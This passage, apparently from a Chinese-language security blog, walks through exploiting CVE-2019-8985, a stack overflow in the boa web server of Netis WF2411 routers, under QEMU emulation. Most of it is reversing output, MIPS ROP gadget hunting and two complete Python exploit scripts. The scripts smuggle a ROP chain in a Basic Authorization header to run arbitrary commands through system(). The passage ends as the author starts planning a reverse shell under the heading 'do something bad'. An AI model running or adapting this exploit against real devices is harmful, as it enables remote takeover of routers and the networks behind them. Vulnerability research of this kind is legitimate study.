--http-user=a --http-password=$(python -c &#x27;print &quot;a&quot;*0x80&#x27;) http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<p>可以看到报错信息如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">translate_uri:222;Wget/1.19.4 (linux-gnu)</span><br><span class=\"line\">translate_uri:254</span><br><span class=\"line\">translate_uri:256</span><br><span class=\"line\">htauth.c:user_auth:181;get password error!</span><br></pre></td></tr></table></figure>\n<p>✨TODO</p>\n<p>逆向一下可以发现要打开一个 passwd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v2 = fopen(<span class=\"string\">&quot;/tmp/passwd&quot;</span>, <span class=\"string\">&quot;r+&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>cp 本地的过去</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/passwd ./tmp</span><br></pre></td></tr></table></figure>\n<p>在 wget 一下 可以看到崩溃</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">caught SIGSEGV, dumping core in /var/boa</span><br><span class=\"line\">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class=\"line\">[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞分析\"><a class=\"markdownIt-Anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h2>\n<p><code>ra</code>  在  <code>sp + 0x14</code> <br>\n <code>buf</code>  在  <code>sp - 0x40</code> <br>\n 也就是 <code>0x54</code>  的 offs<br>\n 同时我们也需要控制五个寄存器 <code>s0 ~ s5</code>  这五个调用者保存寄存器<br>\n这些寄存器主要是为了劫持返回地址 因为会有 sx 传递给 ax<br>\n 然后 jalr ax 的 gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">004146</span>DC                 lw      $ra, <span class=\"number\">0x60</span>+var_s14($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E0</span>                 lw      $s4, <span class=\"number\">0x60</span>+var_s10($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E4</span>                 lw      $s3, <span class=\"number\">0x60</span>+var_sC($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E8</span>                 lw      $s2, <span class=\"number\">0x60</span>+var_s8($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146</span>EC                 lw      $s1, <span class=\"number\">0x60</span>+var_s4($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>0                 lw      $s0, <span class=\"number\">0x60</span>+var_s0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>4                 jr      $ra</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>8                 addiu   $sp, <span class=\"number\">0x78</span></span><br></pre></td></tr></table></figure>\n<p>sprintf 的逆向语句如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sprintf(dest, &quot;%s:%s&quot;, username, password);</span><br></pre></td></tr></table></figure>\n<p><code>boa</code>  has two loaded libraries,  <code>libC</code>  and  <code>libgcc</code> .</p>\n<p>审视一波 libc.so.0</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">Python&gt;</span><span class=\"language-bash\">mipsrop.stackfinder()</span></span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |</span><br><span class=\"line\">|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class=\"line\">|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |</span><br><span class=\"line\">|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |</span><br></pre></td></tr></table></figure>\n<p>没有可用的 gadget<br>\n 再到 libgcc 中找 第二列有 a0 第三列有 s0 ~ s4 就行<br>\n找到这个 也就是要确保</p>\n<ul>\n<li>binsh 地址在 sp + 0x18 (但这个是在执行了 <code>addiu   $sp, 0x78</code>  之后的)</li>\n<li>而 system 在 s3 （sp + 0xc）</li>\n<li>ra 在 sp +0x14</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<p>在 qemu 内模拟</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">  0x400000   0x419000 r-xp    19000 0      /bin/boa</span><br><span class=\"line\">  0x459000   0x45a000 rw-p     1000 19000  /bin/boa</span><br><span class=\"line\">  0x45a000   0x466000 rwxp     c000 0      [heap]</span><br><span class=\"line\">0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]</span><br><span class=\"line\">0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0</span><br><span class=\"line\">0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]</span><br><span class=\"line\">0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0</span><br><span class=\"line\">0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]</span><br><span class=\"line\">0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]</span><br><span class=\"line\">0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]</span><br><span class=\"line\">0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]</span><br></pre></td></tr></table></figure>\n<p>gdb 定位到地址<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png\" alt><br>\n可以看到由于 boa 的限制 ✨TODO<br>\n 我们只溢出了 17 个 cmd 的字节命令<br>\n而 cmd 需要放在 <code>0x40800368</code>  的位置 也就是 esp + 0x18  <code>0x40800350 + 0x18</code></p>\n<p>从这一段可以看出</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► 0x4146dc &lt;user_ok+460&gt;    lw     $ra, 0x74($sp)                &lt;0x4146cc&gt;</span><br><span class=\"line\">  0x4146e0 &lt;user_ok+464&gt;    lw     $s4, 0x70($sp)</span><br><span class=\"line\">  0x4146e4 &lt;user_ok+468&gt;    lw     $s3, 0x6c($sp)</span><br><span class=\"line\">  0x4146e8 &lt;user_ok+472&gt;    lw     $s2, 0x68($sp)</span><br><span class=\"line\">  0x4146ec &lt;user_ok+476&gt;    lw     $s1, 0x64($sp)</span><br><span class=\"line\">  0x4146f0 &lt;user_ok+480&gt;    lw     $s0, 0x60($sp)</span><br><span class=\"line\">  0x4146f4 &lt;user_ok+484&gt;    jr     $ra</span><br></pre></td></tr></table></figure>\n<p>ra 在 sp + 0x74 的位置<br>\n而 jr 之前会做一次 <code>.text:004146F8                 addiu   $sp, 0x78</code> <br>\n 而 gadget 里的 cmd 地址是 <code>addiu   $a0, $sp, 0x20+var_8</code> <br>\n 也就是放在 ra 上  <code>0x78 - 0x74 + 0x18</code>  =  <code>0x1c</code>  的位置</p>\n<p>exp 如下<br>\n s3 的位置是 <code>sp + 0x6c</code>  溢出点离 s0 是  <code>0x40</code> <br>\n 所以溢出点离 s3 是 <code>0x4c</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">libc   \t= <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">gadget \t= <span class=\"number\">0x0000ABD0</span> + libgcc</span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">MAXSZ\t= <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"comment\"># cmd\t\t= b&quot;FUCK&quot; * 50 # 看看长度</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;mkdir hack&quot;</span></span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># fork 0x77f34d30</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] gadget is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gadget)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x4C</span> - <span class=\"number\">2</span>)) <span class=\"comment\"># padding + s0~s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3 &lt;- esp + 0x0c</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s4 </span></span><br><span class=\"line\">\tpayload += p32(gadget) \t\t\t\t\t<span class=\"comment\"># ra &lt;- esp + 0x14</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += cmd  \t\t\t\t\t\t<span class=\"comment\"># \t &lt;- esp + 0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<p>gdb 调试脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set arch mips</span><br><span class=\"line\">set endian big</span><br><span class=\"line\">set solib-search-path sqrootfs/lib/</span><br><span class=\"line\">b *0x4146f4</span><br><span class=\"line\">target remote 10.10.10.1:8888</span><br></pre></td></tr></table></figure>\n<p>程序是 chroot 到 /web 页面下了 所以 mkdir 是在 web 下<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png\" alt></p>\n<p>17 个字节的溢出是很难造成反向 shell 的 也就只能造成一次 17 字节的任意命令执行<br>\n重新考虑 rop</p>\n<h2 id=\"更好的rop\"><a class=\"markdownIt-Anchor\" href=\"#更好的rop\">#</a> 更好的 ROP</h2>\n<p>目标 让最后的 a0 尽可能的接近 sp 的位置<br>\n已知在 vuln 函数最后 jalr ra 之后 sp 是在 ra 上 4 字节</p>\n<h3 id=\"gadget2\"><a class=\"markdownIt-Anchor\" href=\"#gadget2\">#</a> gadget2</h3>\n<p>从 ra 开始到 cmd 结束 有 40 个字节的空区<br>\n要充分利用这 40 字节 就需要降低 esp<br>\n 在 libc 中找到此 gadget<br>\n <code>sp - 0x38 + 0x30 - 0x18 = sp - 0x20</code>  的值给 <code>a0</code>  寄存器<br>\n然后跳到 先前的 <code>a0</code>  里面去<br>\n但是有个问题  <code>sp-0x20</code>  是在 saved 寄存器存放的地方 肯定是很难布置过长的 cmd<br>\n 而且 <code>a0</code>  不可控 我们需要让 <code>a0</code>  可控</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00020650                 addiu   $sp, -0x38</span><br><span class=\"line\">.text:00020654                 sw      $ra, 0x30+var_s0($sp)</span><br><span class=\"line\">.text:00020658                 sw      $gp, 0x30+var_20($sp)</span><br><span class=\"line\">.text:0002065C                 li      $v0, 2</span><br><span class=\"line\">.text:00020660                 move    $t9, $a0</span><br><span class=\"line\">.text:00020664                 sw      $v0, 0x30+var_18($sp)</span><br><span class=\"line\">.text:00020668                 jalr    $t9</span><br><span class=\"line\">.text:0002066C                 addiu   $a0, $sp, 0x30+var_18</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget1\"><a class=\"markdownIt-Anchor\" href=\"#gadget1\">#</a> gadget1</h3>\n<p>而这个 gadget 依靠 <code>a0</code>  进行跳转 我们需要控制 <code>a0</code> <br>\nlibgcc 中<br>\n我们可以控制 <code>a0</code>  也可以控制跳转地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00008B20                 move    $t9, $s4</span><br><span class=\"line\">.text:00008B24                 jalr    $t9 ; sub_8770</span><br><span class=\"line\">.text:00008B28                 move    $a0, $s0</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget3\"><a class=\"markdownIt-Anchor\" href=\"#gadget3\">#</a> gadget3</h3>\n<p>同时 栈下去了 影响到我们的 s 寄存器列了 需要抬上来<br>\n之前 <code>sp</code>  减去了  <code>0x38</code>  那么这里 + 上 <code>0x1c</code>  的地方可以布置下一个 rop 并把 sp 加上来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)</span><br><span class=\"line\">.init:000017A8                 nop</span><br><span class=\"line\">.init:000017AC                 jr      $ra</span><br><span class=\"line\">.init:000017B0                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget4\"><a class=\"markdownIt-Anchor\" href=\"#gadget4\">#</a> gadget4</h3>\n<p>最后 通过 sp 加上 <code>0x18</code>  的位置将 sp 回复到之前的 sp 一样的地址 并 jalr 到 s3</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<h3 id=\"流程图\"><a class=\"markdownIt-Anchor\" href=\"#流程图\">#</a> 流程图</h3>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png\" alt></p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc \t   = <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">gadgets  = [<span class=\"number\">0</span> ,<span class=\"number\">0x00008B20</span> ,<span class=\"number\">0x00020650</span> ,<span class=\"number\">0x000017A4</span> ,<span class=\"number\">0x0000ABD0</span>]</span><br><span class=\"line\">MAXSZ\t   = <span class=\"number\">1024</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;echo &#x27;hacked&#x27; &gt; CrimeStatement&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\trop = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x + libgcc,gadgets))</span><br><span class=\"line\">\trop[<span class=\"number\">2</span>] = rop[<span class=\"number\">2</span>] - libgcc + libc</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] rop[<span class=\"subst\">&#123;i&#125;</span>] is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(rop[i])&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x3C</span> - <span class=\"number\">2</span>))</span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">4</span>])\t\t\t\t\t<span class=\"comment\"># </span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">3</span>])\t\t\t\t\t<span class=\"comment\"># s0</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s1 </span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;CCCC&#x27;</span> \t\t\t\t\t\t<span class=\"comment\"># s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">2</span>])\t\t\t\t\t<span class=\"comment\"># s4</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">1</span>])\t\t\t\t\t<span class=\"comment\"># ra</span></span><br><span class=\"line\">\tpayload += cmd</span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png\" alt></p>\n<h2 id=\"做点坏事\"><a class=\"markdownIt-Anchor\" href=\"#做点坏事\">#</a> 做点坏事</h2>\n<p>既然都拿下了这么长的 cmd<br>\n 那么不做点坏事也说不过去<br>\n busybox 中没有 <code>nc</code>  也没有 <code>bash -i</code>  之类的东西给我们做反向 